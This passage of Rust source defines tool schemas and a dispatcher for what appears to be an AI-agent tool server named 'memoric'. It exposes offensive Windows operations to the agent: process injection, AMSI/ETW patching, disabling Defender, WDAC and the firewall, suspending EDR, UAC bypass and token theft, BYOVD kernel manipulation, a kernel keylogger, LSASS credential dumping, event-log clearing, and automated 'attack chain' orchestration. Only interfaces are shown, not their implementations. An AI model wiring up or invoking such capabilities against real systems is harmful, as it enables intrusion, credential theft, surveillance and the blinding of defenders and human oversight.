                    "export_name": { "type": "string", "description": "Export to hook (threadless)" },
                    "module_name": { "type": "string", "description": "Target module (stomping)" },
                    "shellcode_addr": { "type": "integer", "description": "Pre-allocated shellcode address" },
                    "timeout_ms": { "type": "integer", "default": 30000 }
                },
                "required": ["action"]
            }
        }),
        // ═══════════════════════════════════════════════════════════════════
        // 5. PAYLOAD - PE parsing, obfuscation & lifecycle
        // ═══════════════════════════════════════════════════════════════════
        json!({
            "name": "payload",
            "description": "[PAYLOAD] Payload utilities: PE parsing (imports/exports/sections/IAT), obfuscation (XOR/RC4/AES-256-CTR/polymorphic/UUID/IPv4/MAC), serialization, and injection lifecycle control.",
            "inputSchema": {
                "type": "object",
                "properties": {
                    "action": {
                        "type": "string",
                        "enum": ["pe_parse", "obfuscate", "wait", "exit_code", "cleanup", "serialize"],
                        "description": "Payload action"
                    },
                    "pid": { "type": "integer", "description": "Process ID (for pe_parse)" },
                    "module": { "type": "string", "description": "Module name (for pe_parse)" },
                    "function": { "type": "string", "description": "Function name (for iat_entry lookup)" },
                    "show": {
                        "type": "string",
                        "enum": ["headers", "imports", "exports", "sections", "iat_entry"],
                        "description": "PE info to show"
                    },
                    "obf_method": {
                        "type": "string",
                        "enum": ["xor", "rc4", "aes_ctr", "polymorphic", "uuid", "ipv4", "mac", "transform", "strings"],
                        "description": "Obfuscation method"
                    },
                    "payload": { "type": "array", "items": {"type": "integer"}, "description": "Payload bytes" },
                    "payload_hex": { "type": "string", "description": "Hex-encoded payload" },
                    "key": { "type": "array", "items": {"type": "integer"}, "description": "Encryption key" },
                    "strings": { "type": "array", "items": {"type": "string"}, "description": "Strings to obfuscate" },
                    "tid": { "type": "integer", "description": "Thread ID (for wait/exit_code)" },
                    "handle": { "type": "integer", "description": "Handle to close (for cleanup)" },
                    "address": { "type": "integer", "description": "Memory address (for cleanup)" },
                    "size": { "type": "integer", "description": "Size (for cleanup)" },
                    "rcx": { "type": "integer", "description": "RCX register value" },
                    "rdx": { "type": "integer", "description": "RDX register value" },
                    "r8": { "type": "integer", "description": "R8 register value" },
                    "r9": { "type": "integer", "description": "R9 register value" }
                },
                "required": ["action"]
            }
        }),
        // ═══════════════════════════════════════════════════════════════════
        // 6. HOOK - Function hooking (IAT/inline/hardware)
        // ═══════════════════════════════════════════════════════════════════
        json!({
            "name": "hook",
            "description": "[HOOK] Function hooking: IAT patching, inline detours (JMP), and hardware breakpoints (DR0-DR3, invisible to memory integrity checks). Also supports hook removal.",
            "inputSchema": {
                "type": "object",
                "properties": {
                    "action": {
                        "type": "string",
                        "enum": [
                            "hook_function", "install", "remove", "install_hwbp", "remove_hwbp", "install_iat", "remove_iat",
                            "trampoline", "detour", "restore", "winhook", "hwbp_syscall"
                        ],
                        "description": "Hook action. Prefer hook_function(method='iat'|'inline') over legacy install/install_iat aliases."
                    },
                    "pid": { "type": "integer", "description": "Target process ID" },
                    "tid": { "type": "integer", "description": "Thread ID (for hwbp)" },
                    "method": {
                        "type": "string",
                        "enum": ["iat", "inline", "hwbp"],
                        "description": "Hook method (legacy, prefer specific action)"
                    },
                    "module": { "type": "string", "description": "Imported module name for IAT hooks (e.g. kernel32.dll)" },
                    "function": { "type": "string", "description": "Imported function name for IAT hooks" },
                    "target_function": { "type": "string", "description": "Explicit function name for hook_function(action)" },
                    "target_address": { "type": ["integer", "string"], "description": "Target function address (inline/hwbp/trampoline)" },
                    "hook_address": { "type": ["integer", "string"], "description": "Detour function address" },
                    "iat_address": { "type": ["integer", "string"], "description": "IAT entry address returned by install_iat/payload pe_parse show='iat_entry' (for remove_iat)" },
                    "original_address": { "type": ["integer", "string"], "description": "Original function address to restore into the IAT entry (for remove_iat)" },
                    "dr_index": { "type": "integer", "default": 0, "description": "Debug register 0-3 (hwbp)" },
                    "original_bytes": { "type": "string", "description": "Original bytes hex (for inline remove)" }
                },
                "required": ["action"]
            }
        }),
        // ═══════════════════════════════════════════════════════════════════
        // 7. STEALTH - Evasion, cloaking & self-protection
        // ═══════════════════════════════════════════════════════════════════
        json!({
            "name": "stealth",
            "description": "[STEALTH] Defense evasion: ETW/AMSI patching, direct/indirect syscalls (Hell's/Halo's Gate), ntdll unhooking, sleep obfuscation (Ekko/Foliage/Gargoyle/Death), callstack/PPID spoofing, module hiding, memory encryption, metamorphic code, Sysmon blinding, file timestomping, test signing bypass (NtQuerySystemInformation hook, BCD bypass, auto-inject), and WDAC disable (driver CI patch / DSE bypass / registry).",
            "inputSchema": {
                "type": "object",
                "properties": {
                    "action": {
                        "type": "string",
                        "enum": [
                            "patch_etw", "patch_amsi", "patch_cfg", "patch_cig",
                            "unhook_ntdll", "unhook_function", "hide_module", "fluctuate_module", "module_stomp",
                            "sleep_ekko", "sleep_foliage", "sleep_gargoyle", "sleep_death",
                            "spoof_callstack", "spoof_ppid", "spoof_return", "deep_stack_spoof",
                            "syscall_write", "syscall_alloc", "syscall_protect", "syscall_thread",
                            "syscall_open", "syscall_read", "syscall_query", "syscall_close", "syscall_free",
                            "syscall_stealth_read", "syscall_inject",
                            "encrypt_memory", "decrypt_memory", "mutate_code",
                            "sysmon_blind", "timestomp",
                            "etw_provider_disable", "etw_mass_disable", "create_suspended",
                            "testsign_hide_ntquery", "testsign_hide_self", "testsign_hide_bcd",
                            "testsign_query", "testsign_auto_inject", "testsign_launch_hooked",
                            "testsign_kernel_bypass", "testsign_launch_clean",
                            "testsign_ci_callback", "testsign_ci_func_patch", "testsign_pte_rw",
                            "wdac_disable", "wdac_restore",
                            "defender_disable", "defender_restore", "defender_status",
                            "defender_add_exclusion", "defender_mpcmdrun",
                            "firewall_add_rule", "firewall_remove_rule", "firewall_list_rules",
                            "firewall_disable", "firewall_enable", "firewall_status",
                            "sentinel_start", "sentinel_stop", "sentinel_status", "sentinel_self_destruct"
                        ],
                        "description": "Stealth action"
                    },
                    "pid": { "type": "integer", "description": "Target process ID. For encrypt_memory/decrypt_memory, omit pid or use the memoric server PID only; remote PID/address input is rejected." },
                    "module_name": { "type": "string", "description": "Module to hide/fluctuate" },
                    "delay_ms": { "type": "integer", "default": 5000, "description": "Sleep duration" },
                    "intensity": { "type": "integer", "minimum": 1, "maximum": 3, "description": "Mutation intensity for mutate_code (1-3)" },
                    "syscall_method": {
                        "type": "string",
                        "enum": ["direct", "indirect", "int2e"],
                        "default": "indirect",
                        "description": "Syscall method"
                    },
                    "address": { "type": ["integer", "string"], "description": "Memory address (integer or hex string). encrypt_memory/decrypt_memory require a committed writable local memoric process address." },
                    "size": { "type": "integer", "description": "Size in bytes. Required for encrypt_memory and sleep memory actions." },
                    "protect": { "type": "string", "enum": ["RWX", "RW", "RX", "R"] },
                    "bytes": { "type": "array", "items": {"type": "integer"}, "description": "Bytes for syscall_write" },
                    "target_exe": { "type": "string", "description": "For spoof_ppid or testsign_launch_hooked (exe path)" },
                    "parent_pid": { "type": "integer", "description": "Fake parent PID" },
                    "key": { "type": "string", "description": "Encryption key hex" },
                    "target": { "type": "string", "description": "Target file path (for timestomp)" },
                    "reference": { "type": "string", "description": "Reference file for timestomp (default: kernel32.dll)" },
                    "sysmon_method": { "type": "string", "enum": ["etw_only", "full"], "default": "etw_only", "description": "Sysmon blind method: etw_only or full (also unload driver)" },
                    "bcd_method": { "type": "string", "enum": ["registry", "hook"], "default": "registry", "description": "BCD bypass method for testsign_hide_bcd" },
                    "exe_path": { "type": "string", "description": "Executable path for testsign_launch_hooked" },
                    "args": { "type": "string", "description": "Command-line arguments for testsign_launch_hooked" },
                    "work_dir": { "type": "string", "description": "Working directory for testsign_launch_hooked / testsign_launch_clean" },
                    "ci_action": { "type": "string", "enum": ["patch", "restore", "query"], "default": "patch", "description": "CI callback/func patch action" },
                    "new_pte": { "type": "integer", "description": "New PTE value for pte_rw write/restore" },
                    "method": { "type": "string", "enum": ["auto", "driver_ci", "ci_options", "dse_bypass", "registry", "wmi", "kernel_rw"], "default": "auto", "description": "Disable method (wdac_disable/wdac_restore/defender_disable)" },
                    "exclusion_type": { "type": "string", "enum": ["path", "process", "extension"], "default": "path", "description": "Exclusion type for defender_add_exclusion" },
                    "disable_realtime": { "type": "boolean", "description": "Also disable realtime monitoring (defender_disable)" },
                    "disable_behavior": { "type": "boolean", "description": "Also disable behavior monitoring (defender_disable)" },
                    "disable_cloud": { "type": "boolean", "description": "Also disable cloud/spynet (defender_disable)" },
                    "value": { "type": "string", "description": "Exclusion value or MpCmdRun value" },
                    "path": { "type": "string", "description": "Scan path for defender_mpcmdrun scan command" },
                    "command": { "type": "string", "enum": ["remove_definitions", "restore_defaults", "add_exclusion", "remove_exclusion", "scan", "cancel_scan"], "description": "MpCmdRun command name" },
                    "direction": { "type": "string", "enum": ["in", "out"], "default": "in", "description": "Firewall rule direction" },
                    "protocol": { "type": "string", "default": "any", "description": "Firewall rule protocol (tcp, udp, any)" },
                    "port": { "type": "string", "description": "Firewall rule local port (e.g. 4444 or 8000-9000)" },
                    "name": { "type": "string", "description": "Firewall rule display name (auto-generated stealth name if omitted)" },
                    "program": { "type": "string", "description": "Firewall rule program path" },
                    "rule_action": { "type": "string", "enum": ["allow", "block"], "default": "allow", "description": "Firewall rule action" },
                    "profiles": { "type": "string", "enum": ["domain", "private", "public", "all"], "default": "all", "description": "Firewall profiles to affect" },
                    "name_filter": { "type": "string", "description": "String filter for firewall rule names" },
                    "interval_ms": { "type": "integer", "minimum": 1000, "maximum": 300000, "default": 5000, "description": "Sentinel heartbeat interval in ms" },
                    "patch_etw": { "type": "boolean", "default": true, "description": "Re-patch ETW each cycle (sentinel)" },
                    "patch_amsi": { "type": "boolean", "default": true, "description": "Re-patch AMSI each cycle (sentinel)" },
                    "unhook_ntdll": { "type": "boolean", "default": false, "description": "Re-unhook ntdll each cycle (sentinel)" },
                    "hide_module": { "type": "boolean", "default": true, "description": "Re-hide module each cycle (sentinel)" },
                    "module_name": { "type": "string", "description": "Module name to hide (sentinel)" },
                    "watchdog": { "type": "boolean", "default": false, "description": "Enable watchdog health check (sentinel)" },
                    "self_destruct": { "type": "boolean", "default": false, "description": "Auto self-destruct on detection (sentinel)" },
                    "passes": { "type": "integer", "minimum": 1, "maximum": 7, "default": 7, "description": "DoD wipe passes (sentinel_self_destruct)" },
                    "delete_files": { "type": "boolean", "default": true, "description": "Delete dropped files on self-destruct" },
                    "terminate": { "type": "boolean", "default": true, "description": "Terminate process after self-destruct" }
                },
                "required": ["action"]
            }
        }),
        // ═══════════════════════════════════════════════════════════════════
        // 8. DETECT - System reconnaissance & threat detection
        // ═══════════════════════════════════════════════════════════════════
        json!({
            "name": "detect",
            "description": "[DETECT] System recon: EDR product detection, hook scanning (inline/VEH), ETW session enumeration, VM/sandbox detection, and forensic tool detection (Volatility, Rekall, MemProcFS).",
            "inputSchema": {
                "type": "object",
                "properties": {
                    "action": {
                        "type": "string",
                        "enum": [
                            "edr_products", "edr_hooks", "edr_quick_check", "edr_suspend",
                            "etw_sessions", "veh_chain",
                            "vm_sandbox", "hypervisor", "forensics", "integrity", "hooks",
                            "hook_function", "syscall_resolve", "stealth_score", "bypass_recommendations"
                        ],
                        "description": "Detection action. Prefer hook_function(function_name=...) for single-function checks; hooks remains a compatibility umbrella."
                    },
                    "pid": { "type": "integer", "description": "Target PID (for hooks/suspend)" },
                    "function_name": { "type": "string", "description": "Function to inspect or resolve (for hook_function/syscall_resolve)" },
                    "function": { "type": "string", "description": "Legacy alias for function_name in syscall_resolve" },
                    "target": { "type": "string", "description": "Substring match used by edr_suspend to suspend a specific process family" },
                    "edr_only": { "type": "boolean", "default": true, "description": "Suspend only known EDR processes when action='edr_suspend'" }
                },
                "required": ["action"]
            }
        }),
        // ═══════════════════════════════════════════════════════════════════
        // 9. PRIVILEGE - Elevation & token manipulation
        // ═══════════════════════════════════════════════════════════════════
        json!({
            "name": "privilege",
            "description": "[PRIVILEGE] Privilege escalation: auto UAC bypass (fodhelper/eventvwr/computerdefaults/sdclt), token theft/impersonation, SeDebugPrivilege enable, and NT AUTHORITY\\SYSTEM elevation.",
            "inputSchema": {
                "type": "object",
                "properties": {
                    "action": {
                        "type": "string",
                        "enum": ["elevate", "token_steal", "token_impersonate", "token_revert", "token_scan", "debug_priv", "check", "potato", "service_unquoted", "service_weak_perms", "service_always_elevated", "symlink"],
                        "description": "Privilege action"
                    },
                    "method": {
                        "type": "string",
                        "description": "Elevation method (for elevate: auto/fodhelper/eventvwr/computerdefaults/sdclt/disk_cleanup/mock_trusted_dir/request_uac/system, for potato: print_spoofer/god_potato/efs_potato)"
                    },
                    "pid": { "type": "integer", "description": "Legacy PID field. token_* actions primarily use target_pid; kernel/other tools may still use pid." },
                    "target_pid": { "type": "integer", "description": "Target process ID for token_steal/token_impersonate/token_scan" },
                    "command": { "type": "string", "description": "Command to execute elevated/as impersonated user" },
                    "detail": { "type": "boolean", "default": false, "description": "Detailed output (for check)" },
                    "link_path": { "type": "string", "description": "Symlink/junction/hardlink path (for symlink)" },
                    "target_path": { "type": "string", "description": "Symlink target (for symlink) or spawn target path depending on tool" },
                    "type": { "type": "string", "enum": ["symlink", "hardlink", "junction"], "description": "Filesystem link type for action='symlink'" },
                    "exploit": { "type": "boolean", "default": false, "description": "Actually exploit (for service abuse, default: scan only)" },
                    "payload_path": { "type": "string", "description": "Payload path for service exploit" }
                },
                "required": ["action"]
            }
        }),
        // ═══════════════════════════════════════════════════════════════════
        // 10. KERNEL - Kernel memory & BYOVD operations
        // ═══════════════════════════════════════════════════════════════════
        json!({
            "name": "kernel",
            "description": "[KERNEL] Kernel-level operations: BYOVD driver management (load/unload/discover), kernel memory R/W, physical memory access, PTE/VAD manipulation, callback management, PPL/DSE bypass, DKOM process hiding, test signing concealment (SharedUserData/CI.dll patching), kernel global hooks, auto-injection on process creation, and infinity hook (syscall interception via ETW).",
            "inputSchema": {
                "type": "object",
                "properties": {
                    "action": {
                        "type": "string",
                        "enum": [
                            "driver_load", "driver_unload", "driver_discover", "driver_auto",
                            "read", "write", "physical_read", "physical_write",
                            "pte_modify", "vad_hide", "sniff_start", "sniff_stop",
                            "enum_callbacks", "remove_callback",
                            "object_callback_enum", "object_callback_remove",
                            "registry_callback_enum", "registry_callback_remove",
                            "ppl_bypass", "dse_bypass", "dse_map_driver", "dkom_hide", "module_hide",
                            "minifilter_enum", "minifilter_remove", "token_escalate", "etw_ti_remove",
                            "driver_enum_process", "driver_module_hide", "driver_thread_hide",
                            "driver_callback_enum", "driver_callback_remove", "driver_patch_kernel",
                            "driver_apc_inject", "driver_handle_strip",
                            "driver_reg_protect", "driver_notify_routine",
                            "driver_pe_dump", "driver_set_debug_port",
                            "driver_dpc_timer", "driver_port_hide",
                            "driver_token_dup", "driver_object_hook",
                            "driver_stats",
                            "driver_memory_pool", "driver_minifilter_enum",
                            "driver_process_dump", "driver_hypervisor_detect",
                            "driver_testsign_hide", "driver_global_hook",
                            "driver_auto_inject", "driver_infinity_hook",
                            "driver_ci_callback_patch", "driver_ci_func_patch", "driver_pte_rw",
                            "driver_msr_rw", "driver_cloak", "driver_force_kill",
                            "driver_force_delete", "driver_system_thread", "driver_kernel_exec",
                            "driver_ppl_bypass", "driver_cr_rw", "driver_idt_rw",
                            "driver_unloaded_drv_clear", "driver_token_swap", "driver_process_protect",
                            "driver_keylogger", "driver_reg_hide", "driver_file_lock",
                            "driver_etw_blind", "driver_eprocess_spoof", "driver_event_log_clear",
                            "driver_cred_dump", "driver_impersonate",
                            "driver_callback_nuke", "driver_minifilter_detach",
                            "driver_kernel_apc", "driver_wfp_remove"
                        ],
                        "description": "Kernel action. Groups: generic helpers (driver_load/read/pte_modify/etc), hybrid actions (ppl_bypass/dkom_hide/token_escalate use memoric.sys unless device_path is provided), and direct memoric.sys actions (driver_*). Prefer canonical driver_* names over legacy aliases like notify_routine/reg_protect/object_hook/port_hide."
                    },
                    "driver_path": { "type": "string", "description": "Path to .sys file" },
                    "device_path": { "type": "string", "description": "Explicit BYOVD device path (e.g. \\\\.\\RTCore64). If present, hybrid actions use BYOVD instead of memoric.sys." },
                    "read_ioctl": { "type": "integer", "description": "BYOVD read IOCTL code for pte_modify/vad_hide or hybrid kernel helpers" },
                    "write_ioctl": { "type": "integer", "description": "BYOVD write IOCTL code for pte_modify/vad_hide or hybrid kernel helpers" },
                    "ioctl_code": { "type": "integer", "description": "Explicit IOCTL code for kernel read/write device operations" },
                    "input_struct": { "type": "array", "items": {"type": "integer"}, "description": "Raw input buffer bytes for custom BYOVD IOCTL layouts" },
                    "service_name": { "type": "string", "description": "Service name" },
                    "address": { "type": ["integer", "string"], "description": "Kernel physical/virtual address. Integer or hex string like '0xFFFFF80000000000'." },
                    "cr3": { "type": "integer", "description": "Target process CR3 for pte_modify BYOVD page table walks" },
                    "writable": { "type": "boolean", "description": "Desired writable bit for pte_modify" },
                    "executable": { "type": "boolean", "description": "Desired executable bit for pte_modify" },
                    "size": { "type": "integer", "description": "Size in bytes" },
                    "bytes": { "type": "array", "items": {"type": "integer"}, "description": "Bytes to write (canonical for kernel write / physical_write)" },
                    "data": { "type": "array", "items": {"type": "integer"}, "description": "Legacy alias for bytes on kernel(action='write')" },
                    "physical": { "type": "boolean", "default": false, "description": "Use physical addressing" },
                    "pid": { "type": "integer", "description": "Target PID (for dkom_hide)" },
                    "callback_index": { "type": "integer", "description": "Callback array index" },
                    "callback_type": { "type": "string", "description": "Callback type" },
                    "altitude": { "type": "string", "description": "Minifilter altitude" },
                    "max_entries": { "type": "integer", "description": "Max entries for enum operations" },
                    "driver_name": { "type": "string", "description": "Driver module name for hiding (e.g. memoric.sys)" },
                    "thread_id": { "type": "integer", "description": "Thread ID for thread_hide" },
                    "patch_type": { "type": "string", "enum": ["etw_ti", "dse"], "description": "Kernel patch target" },
                    "enable": { "type": "boolean", "description": "true=restore, false=patch(disable)" },
                    "index": { "type": "integer", "description": "Callback array index" },
                    "callback_address": { "type": ["string", "integer"], "description": "Callback address for verification/removal (hex string or integer)" },
                    "shellcode_address": { "type": ["string", "integer"], "description": "VA of mapped shellcode in target (hex string or integer)" },
                    "shellcode_size": { "type": "integer", "description": "Size of shellcode in bytes" },
                    "strip_type": { "type": "string", "enum": ["process", "thread"], "description": "Handle strip type" },
                    "access_mask": { "type": "integer", "description": "Access mask to strip (0 = close handle)" },
                    "key_path": { "type": "string", "description": "Registry key path (NT format, e.g. \\Registry\\Machine\\SOFTWARE\\...)" },
                    "reg_action": { "type": "string", "enum": ["add", "remove", "list", "clear"], "description": "Registry protection action" },
                    "reg_flags": { "type": "string", "enum": ["delete", "modify", "create", "all"], "description": "Registry protection flags" },
                    "notify_type": { "type": "string", "enum": ["process", "thread", "image"], "description": "Notification callback type" },
                    "notify_action": { "type": "string", "enum": ["register", "unregister", "query"], "description": "Notification action" },
                    "max_events": { "type": "integer", "description": "Max events to return from ring buffer" },
                    "base_address": { "type": ["string", "integer"], "description": "Base address for driver_pe_dump/driver_process_dump (hex string or integer; 0 = auto/full range)" },
                    "max_dump_size": { "type": "integer", "description": "Max PE dump size in bytes" },
                    "debug_action": { "type": "string", "enum": ["clear_port", "no_debug", "hide"], "description": "Anti-debug action" },
                    "timer_index": { "type": "integer", "description": "DPC timer slot (0-7)" },
                    "delay_ms": { "type": "integer", "description": "DPC delay in milliseconds" },
                    "dpc_operation": { "type": "string", "enum": ["log", "hide_process", "escalate_token"], "description": "DPC operation type" },
                    "dpc_action": { "type": "string", "enum": ["schedule", "cancel", "query"], "description": "DPC action" },
                    "port": { "type": "integer", "description": "Port number to hide" },
                    "protocol": { "type": "string", "enum": ["tcp", "udp"], "description": "Port protocol" },
                    "port_action": { "type": "string", "enum": ["add", "remove", "list", "clear"], "description": "Port hide action" },
                    "source_pid": { "type": "integer", "description": "Source PID for token duplication (0 = System)" },
                    "token_action": { "type": "string", "enum": ["copy", "system", "restore"], "description": "Token dup action" },
                    "protect_pid": { "type": "integer", "description": "PID to protect via object callback" },
                    "strip_access": { "type": "integer", "description": "Access bits to strip from handle opens" },
                    "obj_action": { "type": "string", "enum": ["register", "unregister", "query"], "description": "Object hook action" },
                    "testsign_action": { "type": "string", "enum": ["query", "hide_shared", "hide_ci", "restore"], "description": "TestSign action (for driver_testsign_hide)" },
                    "hook_action": { "type": "string", "enum": ["install", "remove", "query"], "description": "Global hook action (for driver_global_hook)" },
                    "hook_type": { "type": "string", "enum": ["inline", "iat", "infinity"], "description": "Global hook type for driver_global_hook" },
                    "hook_index": { "type": "integer", "description": "Hook slot index for driver_global_hook" },
                    "target_module": { "type": "string", "description": "Kernel module name for global hook target (e.g. ntoskrnl.exe)" },
                    "target_function": { "type": "string", "description": "Function name for global hook (e.g. NtQuerySystemInformation)" },
                    "replacement_addr": { "type": ["integer", "string"], "description": "Replacement function address for global hook" },
                    "inject_action": { "type": "string", "enum": ["enable", "disable", "query", "set_payload"], "description": "Auto-inject action (for driver_auto_inject)" },
                    "inject_flags": { "type": "array", "items": {"type": "string", "enum": ["ntquery", "etw", "amsi", "custom"]}, "description": "Auto-inject flags" },
                    "process_filter": { "type": "string", "description": "Process name filter for auto-inject (empty=all)" },
                    "infhook_action": { "type": "string", "enum": ["enable", "disable", "query"], "description": "Infinity hook action (for driver_infinity_hook)" },
                    "syscall_number": { "type": "integer", "description": "Syscall number to intercept (infinity hook)" },
                    "handler_address": { "type": ["integer", "string"], "description": "Custom handler address for infinity hook" },
                    "msr_index": { "type": "integer", "description": "MSR register index (e.g. 0xC0000082 for IA32_LSTAR)" },
                    "msr_value": { "type": ["integer", "string"], "description": "Value to write for driver_msr_rw(write)" },
                    "pte_action": { "type": "string", "enum": ["read", "write", "make_writable", "restore"], "description": "Action for driver_pte_rw" },
                    "ppl_action": { "type": "string", "enum": ["strip", "set", "query"], "description": "Action for driver_ppl_bypass" },
                    "protection_level": { "type": "integer", "description": "Target PPL level for driver_ppl_bypass(set)" },
                    "cr_action": { "type": "string", "enum": ["read", "write"], "description": "Action for driver_cr_rw" },
                    "cr_index": { "type": "integer", "description": "Control register index for driver_cr_rw" },
                    "value": { "type": ["integer", "string"], "description": "Generic integer value used by driver_cr_rw and similar actions" },
                    "idt_action": { "type": "string", "enum": ["read", "write", "dump"], "description": "Action for driver_idt_rw" },
                    "vector": { "type": "integer", "description": "Interrupt vector for driver_idt_rw" },
                    "new_handler": { "type": ["integer", "string"], "description": "Replacement handler address for driver_idt_rw(write)" },
                    "new_dpl": { "type": "integer", "description": "New descriptor privilege level for driver_idt_rw(write)" },
                    "unloaded_action": { "type": "string", "enum": ["query", "clear_all", "clear_name"], "description": "Action for driver_unloaded_drv_clear" },
                    "target_pid": { "type": "integer", "description": "Target PID for token swap or other driver target actions" },
                    "swap_action": { "type": "string", "enum": ["steal", "swap", "query"], "description": "Action for driver_token_swap" },
                    "protect_action": { "type": "string", "enum": ["set", "strip", "query"], "description": "Action for driver_process_protect" },
                    "signer_type": { "type": "integer", "description": "Signer type byte for driver_process_protect(set)" },
                    "signer_audit": { "type": "integer", "description": "Signer audit byte for driver_process_protect(set)" },
                    "signer_level": { "type": "integer", "description": "Signer level byte for driver_process_protect(set)" },
                    "msr_action": { "type": "string", "enum": ["read", "write"], "description": "MSR operation" },
                    "cloak_action": { "type": "string", "enum": ["self", "target", "query"], "description": "Driver cloak action" },
                    "kill_method": { "type": "string", "enum": ["terminate", "dkom", "thread_kill"], "description": "Force kill method" },
                    "exit_code": { "type": "integer", "description": "Process exit code (default: 1)" },
                    "file_path": { "type": "string", "description": "File path for force_delete (NT format: \\??\\C:\\...)" },
                    "thread_start": { "type": ["integer", "string"], "description": "Kernel address for system thread start routine" },
                    "thread_context": { "type": ["integer", "string"], "description": "Context parameter for system thread" },
                    "thread_action": { "type": "string", "enum": ["create", "query"], "description": "System thread action" },
                    "exec_action": { "type": "string", "enum": ["run", "alloc", "free"], "description": "Kernel exec action" },
                    "pool_tag": { "type": ["integer", "string"], "description": "Kernel pool tag filter for driver_memory_pool. Integer raw tag or 4-char ASCII string like 'Proc'." },
                    "flags": { "type": "integer", "description": "Generic driver flags field used by driver_process_dump and similar actions" },
                    "max_size": { "type": "integer", "description": "Maximum dump size for driver_process_dump" },
                    "keylog_action": { "type": "string", "enum": ["start", "stop", "read", "query"], "description": "Action for driver_keylogger" },
                    "max_keys": { "type": "integer", "description": "Maximum key events to read for driver_keylogger" },
                    "hide_type": { "type": "integer", "description": "Registry hide type for driver_reg_hide" },
                    "value_name": { "type": "string", "description": "Registry value name for driver_reg_hide" },
                    "lock_action": { "type": "string", "enum": ["add", "remove", "list", "clear"], "description": "Action for driver_file_lock" },
                    "protect_flags": { "type": "integer", "description": "Protection flags for driver_file_lock" },
                    "allowed_pid": { "type": "integer", "description": "PID exempted from file lock restrictions" },
                    "etw_action": { "type": "string", "enum": ["disable", "enable", "kill_all", "query"], "description": "Action for driver_etw_blind" },
                    "provider_guid": { "type": "string", "description": "Provider GUID for driver_etw_blind" },
                    "spoof_action": { "type": "string", "enum": ["image_name", "command_line", "pid", "query"], "description": "Action for driver_eprocess_spoof" },
                    "new_image_name": { "type": "string", "description": "New image name for driver_eprocess_spoof(image_name)" },
                    "new_command_line": { "type": "string", "description": "New command line for driver_eprocess_spoof(command_line)" },
                    "new_parent_pid": { "type": "integer", "description": "New parent PID for driver_eprocess_spoof(pid)" },
                    "log_action": { "type": "string", "enum": ["clear_all", "clear_security", "clear_system", "clear_sysmon", "kill_service"], "description": "Action for driver_event_log_clear" },
                    "log_name": { "type": "string", "description": "Optional event log name for driver_event_log_clear" },
                    "cred_action": { "type": "string", "enum": ["find_lsass", "read", "dump"], "description": "Action for driver_cred_dump" },
                    "imp_action": { "type": "string", "enum": ["swap", "restore", "query"], "description": "Action for driver_impersonate" },
                    "legit_path": { "type": "string", "description": "Legitimate driver path for driver_impersonate" },
                    "cb_action": { "type": "string", "enum": ["enum", "remove", "nuke_all", "restore"], "description": "Action for driver_callback_nuke" },
                    "cb_type": { "type": "string", "enum": ["process", "thread", "image", "object", "registry"], "description": "Callback family for driver_callback_nuke" },
                    "frame_id": { "type": "integer", "description": "Filter manager frame ID for driver_minifilter_detach(detach)" },
                    "mf_action": { "type": "string", "enum": ["enum", "detach", "nuke"], "description": "Action for driver_minifilter_detach" },
                    "filter_name": { "type": "string", "description": "Filter name for driver_minifilter_detach" },
                    "apc_action": { "type": "string", "enum": ["inject", "dll"], "description": "Action for driver_kernel_apc" },
                    "tid": { "type": "integer", "description": "Thread ID for driver_kernel_apc legacy path" },
                    "shellcode_addr": { "type": ["integer", "string"], "description": "Shellcode address for driver_kernel_apc" },
                    "dll_path": { "type": "string", "description": "DLL path for driver_kernel_apc(dll)" },
                    "wfp_action": { "type": "string", "enum": ["enum", "remove", "nuke"], "description": "Action for driver_wfp_remove" },
                    "callout_id": { "type": "integer", "description": "WFP callout ID for driver_wfp_remove(remove)" },
                    "provider_name": { "type": "string", "description": "WFP provider name for driver_wfp_remove" },
                    "shellcode_bytes": { "type": "array", "items": {"type": "integer"}, "description": "Shellcode bytes for kernel_exec" },
                    "alloc_address": { "type": ["integer", "string"], "description": "Address of previously allocated kernel pool" }
                },
                "required": ["action"]
            }
        }),
        // ═══════════════════════════════════════════════════════════════════
        // 11. SELF - Introspection & self-test
        // ═══════════════════════════════════════════════════════════════════
        json!({
            "name": "self",
            "description": "[SELF] Self introspection: read PEB, query heap info, memory self-test, and self-protection operations.",
            "inputSchema": {
                "type": "object",
                "properties": {
                    "action": {
                        "type": "string",
                        "enum": ["peb", "heap", "test", "status", "info", "version", "state", "protect_init", "protect_encrypt", "protect_decrypt", "protect_wipe", "anti_debug"],
                        "description": "Self action"
                    },
                    "pid": { "type": "integer", "description": "Target PID (for peb/heap)" },
                    "address": { "type": "integer", "description": "Memory address (for encrypt/decrypt/wipe)" },
                    "size": { "type": "integer", "description": "Size in bytes" },
                    "include_scan": { "type": "boolean", "description": "Run optional bytes scan session in self(action='test')", "default": false }
                },
                "required": ["action"]
            }
        }),
        // ═══════════════════════════════════════════════════════════════════
        // 12. ORCHESTRATE - Auto-orchestration engine
        // ═══════════════════════════════════════════════════════════════════
        json!({
            "name": "orchestrate",
            "description": "[ORCHESTRATE] Automated attack chain orchestration. Assesses target environment (EDR/AV/kernel protection), generates adaptive evasion plans, and executes multi-step attack chains with rollback on failure.",
            "inputSchema": {
                "type": "object",
                "properties": {
                    "action": {
                        "type": "string",
                        "enum": ["assess", "execute", "plan", "templates", "status"],
                        "description": "assess=scan environment & recommend profile, execute=run chain, plan=static validation only (does not execute assessment/evasion/injection)"
                    },
                    "pid": { "type": "integer", "description": "Target process ID (for execute)" },
                    "shellcode": { "type": "string", "description": "Hex-encoded shellcode to inject (for execute)" },
                    "dry_run": { "type": "boolean", "description": "If true, plan but don't execute steps", "default": true },
                    "allow_live_execution": { "type": "boolean", "description": "Required with dry_run=false before orchestrate executes state-changing steps", "default": false },
                    "steps": {
                        "type": "array",
                        "description": "Custom chain steps (for plan action)",
                        "items": {
                            "type": "object",
                            "properties": {
                                "tool": { "type": "string" },
                                "action": { "type": "string" },
                                "args": { "type": "object" },
                                "description": { "type": "string" },
                                "required": { "type": "boolean" }
                            }
                        }
                    }
                },
                "required": ["action"]
            }
        }),
    ]
}

// ═════════════════════════════════════════════════════════════════════════════
// Tool Dispatch
// ═════════════════════════════════════════════════════════════════════════════

fn dispatch_standard_tool(name: &str, args: &Value) -> Result<Value, String> {
    match name {
        // ── GUIDE ──
        "memoric" => memoric_guide(args),

        // ── CONSOLIDATED TOOLS ──
        "target" => handle_target(args),
        "memory" => handle_memory(args),
        "inject" => handle_inject(args),
        "payload" => handle_payload(args),
        "hook" => handle_hook(args),
        "stealth" => handle_stealth(args),
        "detect" => handle_detect(args),
        "privilege" => handle_privilege(args),
        "kernel" => handle_kernel(args),
